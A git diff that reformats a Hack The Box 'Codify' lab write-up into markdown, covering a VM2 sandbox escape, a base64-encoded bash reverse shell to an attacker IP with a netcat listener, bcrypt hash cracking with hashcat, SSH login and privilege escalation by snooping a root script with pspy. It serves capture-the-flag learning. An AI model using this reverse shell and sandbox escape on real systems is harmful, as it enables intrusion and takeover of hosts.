@@ -1,11 +1,13 @@
-Initial enumeration:
+## Enumeration
 
 http://codify.htb/about -> Explains that it uses VM2 in a sandbox
 http://codify.htb/editor -> Allows you to submit nodejs code to "test"
 
 VM2 has an exploit: https://security.snyk.io/vuln/SNYK-JS-VM2-5537100
 
-in there, I used the following code to a responsive shell
+In there, I used the following code to a responsive shell
+
+```javascript
 const { VM } = require("vm2");
 const vm = new VM();
 
@@ -27,13 +29,18 @@ const code = `
 `;
 
 console.log(vm.run(code)); // -> hacked
+```
 
-in the .execSync("") function, I setup a base64 encode to bypass URL security
+In the .execSync("") function, I setup a base64 encode to bypass URL security
 
+```bash
 bash -i >& /dev/tcp/ip address/4444 0>&1 -> base64 encoded -> YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41OS80NDQ0IDA+JjE=
+```
+
 Then ship the payload using .execSync("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41OS80NDQ0IDA+JjE= | base64 -d | bash")
 
 with a listener "nc -lvnp 4444"
+```bash
 kali:~$ nc -lvnp 4444
 listening on [any] 4444 ...
 
@@ -51,10 +58,11 @@ sqlite> .users
 sqlite> SELECT * from users;
 SELECT * from users;
 3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+```
 
 Then using a hash identifier, it's bcrypt.
 Cracked the hash via hashcat -m 3200 <rock you word list>
-
+```bash
 $ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
                                                                                                                                                                                                             OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                                                                                                                                                 
@@ -122,10 +130,12 @@ Started: Fri May  3 19:28:33 2024
 Stopped: Fri May  3 19:29:46 2024
 
 Password found: spongebob1
+```
+
 This allows me to SSH into the box as joshua
 ssh joshua@10.10.11.239
 
-Priv Escalation Enumeration
+## Foothold
 
 sudo -l shows that /opt/scripts/mysql-backup.sh is being run as root privilege
 
@@ -135,6 +145,7 @@ This means that, if we can monitor the PID AS mysql-backup.sh is being run, we s
 
 Using pspy, we execute this to snoop the PID then run the backupsql.sh
 
+```bash
 2024/05/03 23:49:22 CMD: UID=0    PID=21396  | /bin/bash /opt/scripts/mysql-backup.sh 
 2024/05/03 23:49:22 CMD: UID=1000 PID=21395  | sudo /opt/scripts/mysql-backup.sh 
 2024/05/03 23:49:24 CMD: UID=0    PID=21398  | /bin/bash /opt/scripts/mysql-backup.sh 
@@ -148,13 +159,15 @@ Using pspy, we execute this to snoop the PID then run the backupsql.sh
 2024/05/03 23:49:46 CMD: UID=1000 PID=21415  | 
 2024/05/03 23:49:46 CMD: UID=0    PID=21416  | 
 2024/05/03 23:49:51 CMD: UID=0    PID=21417  | 
+```
 
 Then using kljh12k3jhaskjh12kjh3 as the password
 
+```bash
 joshua@codify:~$ su -
 Password: 
 root@codify:~# ls
 root.txt  scripts
 root@codify:~# cat root.txt
 a24ce1966e756ce7fe0758e20118f9ce
-
+```
